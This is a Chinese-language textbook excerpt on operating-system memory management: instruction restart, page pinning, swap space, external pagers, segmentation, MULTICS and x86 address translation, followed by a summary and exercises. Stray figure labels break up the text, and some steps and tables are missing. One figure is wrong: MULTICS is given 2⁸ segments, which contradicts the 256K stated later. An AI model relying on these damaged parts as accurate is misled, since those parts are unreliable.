9)调度引发缺页中断的进程，操作系统返回调用它的汇编语言例程。
10)该例程恢复寄存器和其他状态信息，返回到用户空间继续执行，就好像缺页中断没有发生过一样。
3.6.3 指令备份
当程序访问不在内存中的页面时，引起缺页中断的指令会半途停止并引发操作系统的陷阱。
在操作 系统取出所需的页面后，它需要重新启动引起陷阱的指令。
但这并不是一件容易实现的事。
在最坏情形下考察这个问题的实质，考虑一个有双地址 指令的CPU, 比 如Motorola 680x0,这是一种在嵌入式系统 中广泛使用的CPU 。
例如，指令
MOVE.L#6(A1),2(A0)
为6字节(见图3-27)。
为了重启该指令，操作系统要知道该 指令第一个字节的位置。
在陷阱发生时，程序计数器的值 依赖于引起缺页中断的那个操作数以及CPU 中微指令的实 现方式。
图3-27 引起缺页中断的一条指令
在图3-27中，从地址1000处开始的指令进行了3次内存访问：指令字本身和操作数的2个偏移量。
从 可以产生缺页中断的这3次内存访问来看，程序计数器可能在1000、1002和1004时发生缺页中断，对操 作系统来说要准确地判断指令是从哪儿开始的通常是不可能的。
如果发生缺页中断时程序计数器是1002, 操作系统无法弄清在1002位置的字是与1000的指令有关的内存地址(比如， 一个操作数的位置),还是 一个操作码。
这种情况已经很糟糕了，但可能还有更糟的情况。
一些680x0 体系结构的寻址方式采用自动增量， 这也意味着执行这条指令的副作用是会增量一个或多个寄存器。
使用自动增量模式也可能引起错误。
这 依赖于微指令的具体实现，这种增量可能会在内存访问之前完成，此时操作系统必须在重启这条指令前 将软件中的寄存器减量。
自动增量也可能在内存访问之后完成，此时，它不会在陷入时完成而且不必由 操作系统恢复。
自动减量也会出现相同的问题。
自动增量和自动减量是否在相应访存之前完成随着指令 和CPU 模式的不同而不同。
3.6.4 锁定内存中的页面
尽管本章对I/O的讨论不多，但计算机有虚拟内存并不意味着I/O不起作用了。
虚拟内存和I/O通过微 妙的方式相互作用着。
设想一个进程刚刚通过系统调用从文件或其他设备中读取数据到其地址空间中的 缓冲区。
在等待I/O 完成时，该进程被挂起，另一个进程被允许运行，而这个进程产生一个缺页中断。
如果分页算法是全局算法，包含I/O 缓冲区的页面会有很小的机会(但不是没有)被选中换出内存。
如果一个I/O 设备正处在对该页面进行DMA 传输的过程之中，将这个页面移出将会导致部分数据写入它 们所属的缓冲区中，而部分数据被写入到最新装入的页面中。
一种解决方法是锁住正在做I/O 操作的内 存中的页面以保证它不会被移出内存。
锁住一个页面通常称为在内存中钉住 (pinning) 页面。
另一种方 法是在内核缓冲区中完成所有的I/O操作，然后再将数据复制到用户页面。
3.6.5 后备存储
在前面讨论过的页面置换算法中，我们已经知道了如何选择换出内存的页面。
但是却没有讨论当页 面被换出时会存放在磁盘上的哪个位置，现在我们讨论一下磁盘管理相关的问题。
在磁盘上分配页面空间的最简单的算法是在磁盘上设置特殊的交换分区，甚至从文件系统划分一块 独立的磁盘(以平衡I/O 负载)。
大多数UNIX 是这样处理的。
在这个分区里没有普通的文件系统，这样 就消除了将文件偏移转换成块地址的开销。
取而代之的是，始终使用相应分区的起始块号。
当系统启动时，该交换分区为空，并在内存中以单独的项给出它的起始和大小。
在最简单的情况下， 当第一个进程启动时，留出与这个进程一样大的交换区块，剩余的为总空间减去这个交换分区。
当新进 程启动后，它们同样被分配与其核心映像同等大小的交换分区。
进程结束后，会释放其磁盘上的交换区。
交换分区以空闲块列表的形式组织。
更好的算法在第10章里讨论。
地址。
但在进程启动前必须初始化交换区， 一种方法是将整个进程映像复制到交换区，以便随时可将所
需内容装入，另一种方法是将整个进程装入内存，并在需要时换出。
但这种简单模式有一个问题：进程在启动后可能增大，尽管程序正文通常是固定的，但数据有时会 增长，堆栈也总是在随时增长。
这样，最好为正文、数据和堆栈分别保留交换区，并且允许这些交换区 在磁盘上多于一个块。
另一个极端的情况是事先什么也不分配，在页面换出时为其分配磁盘空间，并在换入时回收磁盘空 间，这样内存中的进程不必固定于任何交换空间。
其缺点是内存中每个页面都要记录相应的磁盘地址。
换言之，每个进程都必须有一张表，记录每一个页面在磁盘上的位置。
这两个方案如图3-28所示。
内存 磁盘
a)
b)
图3-28 a) 对静态交换区分页；b) 动态备份页面
在图3-28a中，有一个带有8个页面的页表。
页面0、3、4和6在内存中。
页面1、2、5和7在磁盘上。
磁盘上的交换区与进程虚拟地址空间(8页面)一样大，每个页面有固定的位置，当它从内存中被淘汰 时，便写到相应位置。
该地址的计算需要知道进程的分页区域的起始位置，因为页面是按照它们的虚拟 页号的顺序连续存储的。
内存中的页面通常在磁盘上有镜像副本，但是如果页面装入后被修改过，那么 这个副本就可能是过期的了。
内存中的深色页面表示不在内存，磁盘上的深色页面(原则上)被内存中 的副本所替代，但如果有一个内存页面要被换回磁盘并且该页面在装入内存后没有被修改过，那么将使 用磁盘中(深色)的副本。
在图3-28b中，页面在磁盘上没有固定地址。
当页面换出时，要及时选择一个空磁盘页面并据此来 更新磁盘映射(每个虚拟页面都有一个磁盘地址空间)。
内存中的页面在磁盘上没有副本。
它们在磁盘 映射表中的表项包含一个非法的磁盘地址或者一个表示它们未被使用的标记位。
不能保证总能够实现固定的交换分区。
例如，没有磁盘分区可用时。
在这种情况下，可以利用正常 文件系统中的一个或多个较大的、事前定位的文件。
Windows 就使用这个方法。
然而，可以利用优化方
法减少所需的磁盘空间量。
既然每个进程的程序正文来自文件系统中某个(可执行的)文件，这个可执 行文件就可用作交换区。
而更好的方法是，由于程序正文通常是只读的，当内存资源紧张、程序页不得 不移出内存时，尽管丢弃它们，在需要的时候再从可执行文件读入即可。
共享库也可以用这个方式工作。
3.6.6 策略和机制的分离
控制系统复杂度的一种重要方法就是把策略从机制中分离出来。
通过使大多数存储管理器作为用户 级进程运行，就可以把该原则应用到存储管理中。
在Mach(Young 等人，1987)中首先应用了这种分 离。
下面的讨论是基于Mach 的 。
一个如何分离策略和机制的简单例子可以参见图3-29。
其中存储管理系统被分为三个部分：
1)一个底层MMU处理程序。
2)一个作为内核一部分的缺页中 断处理程序。
3)一个运行在用户空间中的外部
页面调度程序。
所有关于MMU工作的细节都被封 装在MMU处理程序中，该程序的代码 是与机器相关的，而且操作系统每应 用到一个新平台就要被重写一次。
缺 页中断处理程序是与机器无关的代码， 包含大多数分页机制。
策略主要由作 为用户进程运行的外部页面调度程序 所决定。
图3-29 用一个外部页面调度程序来处理缺页中断
当一个进程启动时，需要通知外部页面调度程序以便建立进程页面映射，如果需要的话还要在磁盘 上分配后备存储。
当进程正在运行时，它可能要把新对象映射到它的地址空间，所以还要再一次通知外 部页面调度程序。
一旦进程开始运行，就有可能出现缺页中断。
缺页中断处理程序找出需要哪个虚拟页面，并发送一 条消息给外部页面调度程序告诉它发生了什么问题。
外部页面调度程序从磁盘中读入所需的页面，把它 复制到自己的地址空间的某一位置。
然后告诉缺页中断处理程序该页面的位置。
缺页中断处理程序从外 部页面调度程序的地址空间中清除该页面的映射，然后请求MMU 处理程序把它放到用户地址空间的正 确位置，随后就可以重新启动用户进程了。
这个实现方案没有给出放置页面置换算法的位置。
把它放在外部页面调度程序中比较简单，但会有 一些问题。
这里有一条原则就是外部页面调度程序无权访问所有页面的R位 和M 位。
这些二进制位在许 多页面置换算法起重要作用。
这样就需要有某种机制把该信息传递给外部页面调度程序，或者把页面置 换算法放到内核中。
在后一种情况下，缺页中断处理程序会告诉外部页面调度程序它所选择的要淘汰的 页面并提供数据，方法是把数据映射到外部页面调度程序的地址空间中或者把它包含到一条消息中。
两 种方法中，外部页面调度程序都把数据写到磁盘上。
这种实现的主要优势是有更多的模块化代码和更好的适应性。
主要缺点是由于多次交叉“用户-内 核”边界引起的额外开销，以及系统模块间消息传递所造成的额外开销。
现在看来，这一主题有很多争 议，但是随着计算机越来越快，软件越来越复杂，从长远来看，对于大多数实现，为了获得更高的可靠 性而牺牲一些性能也是可以接受的。
3.7 分段
到目前为止讨论的虚拟内存都是一维的，虚拟地址从0到最大地址， 一个地址接着另一个地址。
对 许多问题来说，有两个或多个独立的地址空间可能比只有一个要好得多。
比如， 一个编译器在编译过程 中会建立许多表，其中可能包括：
1)被保存起来供打印清单用的源程序正文(用于批处理系统)。
2)符号表，包含变量的名字和属性。
行期间可以动态改变，比如，堆栈段的长度在数据被压入时会增长，在数据被弹出时又会减小。
因为每个段都构成了一个独立的地址空间，所以它们可以独立地增长或减小而不会影响到其他的段。
如果一个在某个段中的堆栈需要更多的空间，它就可以立刻得到所需要的空间，因为它的地址空间中没 有任何其他东西阻挡它增长。
段当然有可能会被装满，但通常情况下段都很大，因此这种情况发生的可 能性很小。
要在这种分段或二维的存储器中指示一个地址，程序必须提供两部分地址， 一个段号和一个 段内地址。
图3-31给出了前面讨论过的编译表的分段内存，其中共有5个独立的段。
段
0
段
1
2 3
4
图3-31 分段存储管理，每一个段都可以独立地增大或减小而不会影响其他的段
需要强调的是，段是一个逻辑实体，程序员知道这一点并把它作为一个逻辑实体来使用。
一个段可 能包括一个过程、 一个数组、 一个堆栈、 一组数值变量，但一般它不会同时包含多种不同类型的内容。
除了能简化对长度经常变动的数据结构的管理之外，分段存储管理还有其他一些优点。
如果每个过 程都位于一个独立的段中并且起始地址是0,那么把单独编译好的过程链接起来的操作就可以得到很大 的简化。
当组成一个程序的所有过程都被编译和链接好以后， 一个对段n中过程的调用将使用由两个部
分组成的地址 (n,0) 来寻址到字0(入口点)。
如果随后位于段n的过程被修改并被重新编译，即使新版本的程序比老的要大，也不需要对其他的 过程进行修改(因为没有修改它们的起始地址)。
在一维地址中，过程被一个挨一个紧紧地放在一起，
中间没有空隙，因此修改一个过程的大小会影响其他无关的过程的起始地址，而这又需要修改调用了这 些被移动过的过程的所有过程，以使它们的访问指向这些过程的新地址。
在一个有数百个过程的程序中， 这个操作的开销可能是相当大的。
分段也有助于在几个进程之间共享过程和数据。
这方面一个常见的例子就是共享库(shared library)。
运行高级窗口系统的现代工作站经常要把非常大的图形库编译进几乎所有的程序中。
在分段系统中，可以 把图形库放到一个单独的段中由各个进程共享，从而不再需要在每个进程的地址空间中都保存一份。
虽然 在纯的分页系统中也可以有共享库，但是它要复杂得多，并且这些系统实际上是通过模拟分段来实现的。
因为每个段是一个为程序员所知道的逻辑实体，比如一个过程或一个数组，故不同的段可以有不同 种类的保护。
一个过程段可以被指明为只允许执行，从而禁止对它的读出和写入； 一个浮点数组可以被 指明为允许读写但不允许执行，任何试图向这个段内的跳转都将被截获。
这样的保护有助于找到编程错 误，图3-32对分段和分页进行了比较。
考查点 分页 分段
图3-32 分页与分段的比较
3.7.1 纯分段的实现
分段和分页的实现本质上是不同的：页面是定长的而段不是。
图3-33a所示的物理内存在初始时包 含了5个段。
现在让我们考虑当段1被淘汰后，比它小的段7放进它的位置时会发生什么样的情况。
这时 的内存配置如图3-33b所示，在段7与段2之间是一个未用区域，即一个空闲区。
随后段4被段5代替，如 图3-33c所示；段3被段6代替，如图3-33d所示。
在系统运行一段时间后内存被划分为许多块， 一些块包 含着段， 一些则成了空闲区，这种现象称为棋盘形碎片或外部碎片 (external fragmentation)。
空闲区的 存在使内存被浪费了，而这可以通过内存紧缩来解决，如图3-33e所示。
3.7.2 分段和分页结合：MULTICS
如果一个段比较大，把它整个保存在内存中可能很不方便甚至是不可能的，因此产生了对它进行分页 的想法。
这样，只有那些真正需要的页面才会被调入内存。
有几个著名的系统实现了对段的分页支持，本节 将介绍第一个实现了这种支持的系统——MULTICS。
下一节将介绍一个更新的例子——Intel x86到x86-64。
MULTICS是有史以来最具影响力的操作系统之一，对UNIX系统、x86 存储器体系结构、快表以及云计 算均有过深刻的影响。
MULTICS始于麻省理工学院的一个研究项目，并在1969年上线。
最后一个MULTICS 系统在运行了31年后于2000年关闭。
几乎没有其他的操作系统能像MULTICS一样几乎没有修改地持续运行
a)
b)
c)
d)
e)
图3-33 a)~d)棋盘形碎片的形成；e)通过紧缩消除棋盘形碎片
MULTICS运行在Honeywell 6000计算 机和它的一些后继机型上。
它为每个程序 提供了最多2⁸个段，每个段的虚拟地址空 间最长为65536个(36位)字长。
为了实 现它，MULTICS 的设计者决定把每个段 都看作一个虚拟内存并对它进行分页，以 结合分页的优点(统一的页面大小和在只 使用段的一部分时不用把它全部调入内 存)和分段的优点(易于编程、模块化、 保护和共享)。
每个MULTICS程序都有一个段表， 每个段对应一个描述符。
因为段表可能 会有25万多个表项，段表本身也是一个 段并被分页。
一个段描述符包含了一个 段是否在内存中的标志，只要一个段的 任何一部分在内存中这个段就被认为是 在内存中，并且它的页表也会在内存中。
如果一个段在内存中，它的描述符将包 含一个18位的指向它的页表的指针(见 图3-34a) 。
因为物理地址是24位并且页 面是按照64字节的边界对齐的(这隐含 着页面地址的低6位是000000),所以在 描述符中只需要18位来存储页表地址。
段描述符中还包含了段大小、保护位以 及其他的一些条目。
图3-34b 为一个 MULTICS段描述符的示例。
段在辅助
36位
页面0表项 段1的页表
a)
9 1113 3
保护位
b)
图3-34 MULTICS 的虚拟内存：a)描述符段指向页表；b) 一个 段描述符，其中的数字是各个域的长度
存储器中的地址不在段描述符中，而是在缺段处理程序使用的另一个表中。
每个段都是一个普通的虚拟地址空 间，采用本章前面讨论过的非分段式分页 存储方式进行分页。
一般的页面大小是 1024个字(尽管有一些MULTICS 自己使
段号
18
段内地址
6 10
用的段不分页或以64个字为单元进行分页 以节省物理内存)。
MULTICS中一个地址由两部分构成： 段和段内地址。
段内地址又进一步分为页 号和页内的字，如图3-35所示。
在进行内 存访问时，执行下面的算法。
1)根据段号找到段描述符。
2)检查该段的页表是否在内存中。
如 果在，则找到它的位置；如果不在，则产 生一个段错误。
如果访问违反了段的保护 要求就发出一个越界错误(陷阱)。
3)检查所请求虚拟页面的页表项，如 果该页面不在内存中则产生一个缺页中 断，如果在内存就从页表项中取出这个页 面在内存中的起始地址。
5)最后进行读或写操作。
这个过程如图3-36所示。
为了简单起 见，忽略描述符段自己也要分页的事实。
实际的过程是通过一个寄存器(描述符基 址寄存器)找到描述符段的页表，这个页 表指向描述符段的页面。
一旦找到了所需 段的描述符，寻址过程就如图3-36所示。
正如读者所想，如果对于每条指令都由 操作系统来运行上面所述的算法，那么程序 就会运行得很慢。
实际上， MULTICS 硬件 包含了16个字的高速TLB, 对给定的关键字 它能并行搜索所有的表项，如图3-37所示。
图3-35 一个34位的MULTICS虚拟地址
MULTICS 虚拟地址
图3-36 两部分组成的MULTICS地址到内存地址的转换
这个表项是 否在使用?
比 较 域
生存 时间
图3-37 一个简化的MULTICS的TLB, 两个页面大小的存 在使得实际的TLB更复杂
当 一 个地址被送到计算机时，寻址硬件首先
检查虚拟地址是不是在TLB中。
如果在，就直接从TLB中取得页框号并生成要访问的字的实际地址，而不 必到描述符段或页表中去查找。
TLB中保存着16个最近访问的页的地址，工作集小于TLB 容量的程序将随着整个工作集的地址被 装入TLB中而逐渐达到稳定，开始高效地运行；否则将产生TLB 错误。
3.7.3 分段和分页结合： Intel x86
x86 处理器的虚拟内存在许多方面都与MULTICS 类似，其中包括既有分段机制又有分页机制。
MULTICS 有256K 个独立的段，每个段最长可以有64K 个36位字。
x86 处理器有16K 个独立的段，每个段 最多可以容纳10亿个32位字。
这里虽然段的数目较少，但是相比之下x86较大的段大小特征比更多的段 个数要重要得多，因为几乎没有程序需要1000个以上的段，但是有很多程序需要大段。
自从x86-64 起， 除了在“传统模式”下，分段机制已被认为是过时的且不再被支持。
虽然在x86-64的本机模式下仍然有
分段机制的某些痕迹，但大多只是为了兼容，且它们不再具起到同样的作用，也不再提供真正的分段。
但是X86-32依然配备了所有的处理机制，这就是我们将在这一节讨论的CPU。
x86 处理器中虚拟内存的核心是两张表，即LDT(Local Descriptor Table,局部描述符表)和GDT (Global Descriptor Table,全局描述符表)。
每个程序都有自己的LDT, 但是同一台计算机上的所有程序共享一 个GDT。
LDT描述局部于每个程序的段，包括其代码、数据、堆栈等；GDT描述系统段，包括操作系统本身。
为了访问一个段，一个x86程序必须把这个段的选择子 (selector) 装入机器的6个段寄存器的某一 个中。
在运行过程中，CS 寄存器保存代码段的选
择子，DS 寄存器保存数据段的选择子，其他的段 寄存器不太重要。
每个选择子是一个16位数，如 图3- 38所示。
选择子中的一位指出这个段是局部的还是全 局的(即它是在LDT 中还是在GDT 中),其他的 13位是LDT 或GDT 的表项编号。
因此，这些表
位
0=GDT/1=LDT 特权级(0～3) 图3-38 x86处理器中的选择子
的长度被限制在最多容纳8K个段描述符。
还有两位和保护有关，我们将在后面讨论。
描述符0是禁止 使用的，它可以被安全地装入一个段寄存器中用来表示这个段寄存器目前不可用，如果使用会引起一次 陷 阱 。
在选择子被装入段寄存器时，对应的描述符被从LDT 或GDT 中取出装入微程序寄存器中，以便快速 地访问。
一个描述符由8个字节构成，包括段的基址、大小和其他信息，如图3-39所示。
图3-39 x86处理器代码段描述符(数据段略有不同)
现在跟踪一下一个描述地址的(选择子，偏移量)二元组被转换为物理地址的过程。
微程序知道具 体要使用哪个段寄存器后，它就能从内部寄存器中找到对应于这个选择子的完整的描述符。
如果段不存 在(选择子为0)或已被换出，则会发生一次陷阱。
硬件随后根据Limit (段长度)域检查偏移量是否超出了段的结尾，如果是，也发生一次陷阱。
从逻
示。
为了和只有24位基址的286兼容，基址被分为3片分布在描述符的各个位置。
实际上，基址允许每个 段的起始地址位于32位线性地址空间内的任何位置。
如果禁止分页(通过全局控制寄存器中的一位),线性地址就被解释为物理地址并被送往存储器用 于读写操作。
因此在禁止分页时，我们就得到了一个纯的分段方案。
各个段的基址在它的描述符中。
另 外，段之间允许互相覆盖，这可能是因为验证所有的段都互不重叠太麻烦太费时间的缘故。
另一方面，如果允许分页，线性地址就被解释为虚拟地址并通过页表映射到物理地址，很像前面讲 过的例子。
这里唯一真正复杂的是在32位虚拟地址和4KB 页的情况下， 一个段可能包含多达100万个页 面，因此使用了两级映射，以便在段较小时减小页表大小。
每个运行程序都有一个由1024个32位表项组成的页目录 (page directory)。
它通过一个全局寄存器 来定位。
这个目录中的每个目录项都指向一个也包含1024个32位表项的页表，页表项指向页框，这个方 案如图3-41所示。
线性地址
位
10 10 12
a)
页目录 页表 页框 所选
的字
1024
项
目录
偏移量
页面
目录项指向页表 页表表项指
向字
b)
图3-41 线性地址到物理地址的映射
每个页表项是32位，其中20位是页框号。
其余的位包含了由硬件设置供操作系统使用的访问位和脏 位、保护位和一些其他有用的位。
每个页表有描述1024个4KB 页框的表项，因此一个页表可以处理4MB的内存。
一个小于4MB的段的 页目录中将只有一个表项，这个表项指向一个唯一的页表。
通过这种方法，长度短的段的开销只是两个 页面，而不是一级页表时的100万个页面。
为了避免重复的内存访问，x86 处理器和MULTICS一样，也有一个小的TLB把最近使用过的“目 录-页面”二元组映射为页框的物理地址。
只有在当前组合不在TLB中时，图3-41所示的机制才被真正 执行并更新TLB。
只要TLB的缺失率很低，则性能就不错。
还有一点值得注意，如果某些应用程序不需要分段，而是需要一个单独的、分页的32位地址空间， 这样的模式是可以做到的。
这时，所有的段寄存器可以用同一个选择子设置，其描述符中基址设为0, 段长度被设置为最大。
指令偏移量会是线性地址，只使用了一个地址空间——效果上就是正常的分页。
事实上，所有当前的x86 操作系统都是这样工作的。
OS/2 是唯一一个使用Intel MMU体系结构所有功能 的操作系统。
那么,英特尔为什么要剔除它支持了近30年，且源自表现良好的MULTICS 存储模型的变形体呢?
也许最主要的原因是UNIX 和Windows 都不曾使用过该模型，即使它通过在受保护的操作系统段内进行
内 存 管 理 14]
针对相关地址的过程调用而消除了系统调用，并具有很高的效率。
没有哪个UNIX 或Windows 系统的开 发人员愿意将已有的存储模型转变为针对x86 使用的模型，因为这会破坏系统的可移植性。
由于软件层 并没有使用相关的功能，导致英特尔不愿再以牺牲芯片面积为代价来支持它，并最终从64位CPU 中剔除 了它 。
不管怎么说，我们不得不称赞x86处理器的设计者，因为他们面对的是互相冲突的目标，实现纯的 分页、纯的分段和段页式管理，同时还要与286兼容，而他们高效地实现了所有的目标，最终的设计非 常简洁 。
3.8 有关内存管理的研究
传统的内存管理(尤其是单处理器CPU的页面算法)研究硕果累累，时至今日，仍有人坚守阵地继 续研究(Moruz 等人，2012),或者在此基础上关注某些特殊需求的应用(Stoica 和 Ailamaki,2013),
另外，手机和平板等电子设备也逐渐转型为小型电脑，也会进行从RAM 到“磁盘”的页面置换， 不过手机上的磁盘是闪存，Joo 等人(2012)最近做了一些相关研究。
最后，实时系统的内存管理研究仍在继续 (Kato 等人，2011)。
3.9 小结
本章主要讲解内存管理。
我们看到在最简单的系统中是根本没有任何交换或分页的。
一旦程序装入 内存，它将持续在内存中运行，直到结束。
一些操作系统一次只允许一个进程在内存中运行，而另一些 操作系统支持多道程序设计。
这种模型在小型或嵌入式实时系统中仍有用武之地。
接下来是交换技术。
通过交换技术，系统可以同时运行总内存占用超过实际物理内存大小的多个进 程。
如果一个进程没有内存空间可用，它将会被交换到磁盘上。
内存和磁盘上的空闲空间可以使用位图 或空闲区链表来记录。
现代计算机都有某种形式的虚拟内存。
最简单的情况下，每一个进程的地址空间被划分为同等大小 的块，称为页面，页面可以被放入内存中任何可用的页框内。
有多种页面置换算法，其中两个比较好的 算法是老化算法和工作集时钟算法。
为了使分页系统工作良好，仅选择算法是不够的，还要关注诸多问题，例如工作集的确定、内存分 配策略以及所需页面大小等。
如果要处理在执行过程中大小有变化的数据结构，分段是一个有用的选择，它还能简化链接和共享。
不仅如此，分段还有利于为不同的段提供不同的保护。
有时，可以把分段和分页结合起来，以提供二维 的虚拟内存。
MULTICS 系统以及32位Intel x86即是如此，支持分段也支持分页。
不过，几乎没有操作系 统开发者会仔细考虑分段(因为他们更青睐其他的内存模型),这导致分段逐渐乏人问津。
如今，即使 64位版本的x86也不支持真正的分段。
习题
2.在图3-3中基址寄存器和限界寄存器含有相同 的值16384,这是巧合还是它们总是相等?
如 果这只是巧合，为什么在这个例子里它们是相 等的?
3.交换系统通过“紧缩”来消除空闲区。
假设有 很多空闲区和数据段随机分布，并且读或写32 位长的字需要4ns的时间，“紧缩”4GB的空间 大概需要多长时间?
为了简单起见，假设字节0 在空闲区中，内存中最高地址处含有有效数据。
4.在一个交换系统中，按内存地址排列的空闲区 大小是10MB 、4MB 、20MB 、18MB 、7MB、
9MB 、12MB 和15MB。
对于连续的段请求：
(a)12MB
(b)10MB
(c)9MB
使用首次适配算法，将找出哪个空闲区?
使用 最佳适配、最差适配、下次适配算法呢?
5.物理地址和虚拟地址有什么区别?
6. 对下面的每个十进制虚拟地址，分别使用4KB 页面和8KB页面计算虚拟页号和偏移量：20000, 32768,60000。
7.使用图3-9的页表，给出下面每个虚拟地址对应 的物理地址：
(a)20
(b)4100
(c)8300
8.Intel 8086处理器没有MMU, 也不支持虚拟内 存，然而一些公司曾经出售过这种系统：包含 未做任何改动的8086 CPU, 支持分页。
猜想一 下，他们是如何做到这一点的。
(提示：考虑 MMU的逻辑位置。
)
9.为了让分页虚拟内存工作，需要怎样的硬件 支持?
11. 考虑下面的C程序：
int X[N];
int step =M; //M是某个预定义的常量
for (int i=0;i<N;i+=step)X[i]=X[i]+1;
(a) 如果这个程序运行在一个页面大小为4KB 且有64个TLB表项的机器上，那么M和N取 什么值会使得内层循环的每次执行都引起 TLB 失效?
(b) 如果循环重复很多遍，结果会和a的答案相 同吗?
请解释。
12.可用于存储页面的有效磁盘空间的大小和下列 因素有关：最大进程数n, 虚拟地址空间的字 节数v,RAM 的字节数r。
给出最坏情况下磁盘 空间需求的表达式。
这个数量的真实性如何?
13. 如果一条指令执行1ns, 缺页中断执行额外的 Nns, 且每k条指令产生一个缺页，请给出一个 公式，计算有效指令时间。
14. 一个机器有32位地址空间和8KB页面，页表全 在硬件中，页表的每一表项为一个32位字。
进 程启动时，以每个字100ns的速度将页表从内 存复制到硬件中。
如果每个进程运行100 ms (包含装入页表的时间),用来装入页表的CPU 时间的比例是多少?
15.假设一个机器有48位的虚拟地址和32位的物理 地址。
(a) 假设页面大小是4KB, 如果只有一级页表， 那么在页表里有多少页表项?
请解释。
(b) 假设同一系统有TLB, 该TLB 有32个表项。
并且假设一个程序的指令正好能放入一个 页，其功能是顺序地从数组中读取长整型 元素，该数组存在上千个不同的页中。
在 这种情况下TLB的效果如何?
16.给定一个虚拟内存系统的如下数据：
(a)TLB 有1024项，可以在1个时钟周期(1ns) 内访问。
(b) 页表项可以在100时钟周期(100 ns)内访问。
(c) 平均页面替换时间是6ms。
如果TLB处理的页面访问占99%,并且0.01% 的页面访问会发生缺页中断，那么有效地址转 换时间是多少?
17.假设一个机器有38位的虚拟地址和32位的物理 地址。
(a) 与一级页表比较，多级页表的主要优点是 什么?
(b) 若采用二级页表，页面大小为16KB, 每个 页表项为4字节，应该对第一级页表域分配 多少位?
对第二级页表域分配多少位?
请 解释原因。
18. 在3.3.4节的陈述中，奔腾Pro 将多级页表中的 每个页表项扩展到64位，但仍只能对4 GB 的 内存进行寻址。
请解释页表项为64位时，为何 这个陈述正确。
19.一个32位地址的计算机使用两级页表。
虚拟地 址被分成9位的第一级页表域、11位的二级页 表域和一个偏移量，页面大小是多少?
在地址 空间中一共有多少个页面?
20.一个计算机使用32位的虚拟地址，4KB 大小的 页面。
程序和数据都位于最低的页面(0~4095), 栈位于最高的页面。
如果使用传统(一级)分 页，页表中需要多少个表项?
如果使用两级分 页，每部分有10位，需要多少个页表项?
21.如下是在页大小为512字节的计算机上， 一个 程序片段的执行轨迹。
这个程序在1020地址， 其栈指针在8192(栈向0生长)。
请给出该程序 产生的页面访问串。
每个指令(包括立即常数 数)占4个字节(1个字)。
指令和数据的访问 都要在访问串中计数。
将字6144载入寄存器0
寄存器0压栈
调用5120处的程序，将返回地址压栈 栈指针减去立即数16
比较实参和立即数4
如果相等，跳转到5152处
22.一台计算机的进程在其地址空间有1024个页 面，页表保存在内存中。
从页表中读取一个字 的开销是5ns 。
为了减小开销，该计算机使用
了TLB, 它有32个(虚拟页面，物理页框)对， 能在1ns 内完成查找。
请问把平均开销降到2ns 需要的命中率是多少?
23.TLB 需要的相联内存设备如何用硬件实现?
这 种设计对扩展性意味着什么?
24.一台机器有48位虚拟地址和32位物理地址，页 面大小是8KB, 如果采用一级线性页表，页表 中需要多少个表项?
25.一个计算机的页面大小为8KB, 主存大小为 256KB,64GB 虚拟地址空间使用倒排页表实现 虚拟内存。
为了保证平均散列链的长度小于1, 散列表应该多大?
假设散列表的大小为2的幂。
27.假设虚拟页码索引流中有一些重复的页索引序 列，该序列之后有时会是一个随机的页码索引。
例如，序列0,1, … ,511,431,0,1, … ,
5 1 1 , 3 3 2 , 0 , 1 , … 中 就 包 含 了 0 , 1 , … , 511的重复，以及跟随在它们之后的随机页码 索引431和332。
(a) 在工作负载比该序列短的情况下，标准的 页面置换算法 (LRU,FIFO,Clock) 在处 理换页时为什么效果不好?
(b) 如果一个程序分配了500个页框，请描述一 个效果优于LRU 、FIFO 或Clock 算法的页面 置换方法。
28. 如果将FIFO 页面置换算法用到4个页框和8个 页面上，若初始时页框为空，访问序列串为 0172327103,请问会发生多少次缺页中断?
如 果使用LRU 算法呢?
29.考虑图3-15 b中的页面序列。
假设从页面B到 页面A的 R位分别是11011011。
使用第二次机 会算法，被移走的是哪个页面?
30.一台小计算机有4个页框。
在第一个时钟周期 时R位是0111(页面0是0,其他页面是1),在 随后的时钟周期中这个值是1011、1010、1101、 0010、1010、1100、0001。
如果使用带有8位 计数器的老化算法，给出最后一个时钟周期后 4个计数器的值。
31.请给出一个页面访问序列，使得对于这个访问 序列，使用Clock 算法和LRU算法得到的第一个 被置换的页面不同。
假设一个进程分配了3个 页框，访问串中的页号属于集合0,1,2,3。
32. 在图3-20 c的工作集时钟算法中，表针指向那 个R=0 的页面。
如果t=400, 这个页面将被移 出吗?
如果t=1000 呢?
33.假如工作集时钟页面置换算法使用的τ为两个 时钟周期，系统状态如下：
其中，标志位V 代表有效位，R 代表访问位， M 代表修改位。
(a) 如果时钟中断发生在时钟周期10,请给出 新的表项内容并给出解释(可以忽略没有 改变的表项)。
(b) 假如没有时钟中断，在时钟周期10,因为 向页4发出了一个读请求而发生了缺页中 断。
请给出新的表项内容并解释(可以忽 略没有改变的表项)。
34.一个学生声称：“抽象来看，除了选取替代页 面使用的属性不同外，基本页面置换算法 (FIFO,LRU, 最优算法)都相同。
”
(a)FIFO 、LRU 、 最优算法使用的属性是什 么?
(b) 请给出这些页面置换算法的通用算法。
35. 从平均寻道时间10ms 、旋转延迟时间10ms、 每磁道32KB的磁盘上载入一个64KB的程序， 对于下列页面大小分别需要多少时间?
(a) 页面大小为2KB。
(b) 页面大小为4KB。
假设页面随机地分布在磁盘上，柱面的数目非 常大，以致于两个页面在同一个柱面的概率可 以忽略不计。
36.一个计算机有4个页框，载入时间、最近一次 访问时间和每个页的R位和M位如下所示(时 间以一个时钟周期为单位):
(a)NRU 算法将置换哪个页面?
(b)FIFO 算法将置换哪个页面?
(c)LRU 算法将置换哪个页面?
(d)第二次机会算法将置换哪个页面?
37. 假设有两个进程A和B, 共享一个不在内存的 页。
如果进程A在共享页发生缺页，当该页读 入内存时，A 的页表项必须更新。
(a) 在什么条件下，即使进程A的缺页中断处理 会将共享页装入内存，B 的页表更新也会延 迟?
(b) 延迟页表更新会有什么潜在开销?
38.有二维数组：
int X[64][64];
假设系统中有4个页框，每个页框大小为128 个字(一个整数占用一个字)。
处理数组X 的 程序正好可以放在一页中，而且总是占用0号 页。
数据会在其他3个页框中被换入或换出。
数组X为按行存储(即，在内存中， X[0][0] 之 后是X[0][1]) 。
下面两段代码中，哪一个会有
最少的缺页中断?
请解释原因，并计算缺页中 断的总数。
A段
for(int j=0;j<64;j++)
for(int i=0;i<64;i++)X[i][j]=0; B段
for(int i=0;i<64;i++)
for (int j=0;j<64;j++)X[i][j]=0;
(a) 这种方法如何实现?
(b)在什么条件下该方法是有价值的、有效的?
